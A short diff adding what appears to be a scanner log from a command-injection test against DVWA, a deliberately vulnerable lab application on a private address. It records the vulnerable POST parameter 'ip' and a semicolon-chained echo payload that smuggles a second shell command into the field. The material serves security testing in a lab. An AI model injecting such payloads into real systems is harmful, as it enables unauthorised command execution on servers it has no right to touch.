@@ -1,0 +1,9 @@
+
+=====================================
+| Started in 12/08/2017 at 09:59:04 |
+=====================================
+[+] Tested URL : http://192.168.93.139/dvwa/vulnerabilities/exec/#
+[+] Type: Results-Based Os Command Injection
+[+] Technique: Classic Command Injection Technique
+[+] Parameter: (POST) ip
+    (1) Payload: ;echo MFAKOD$((3%2B54))$(echo MFAKOD)MFAKOD
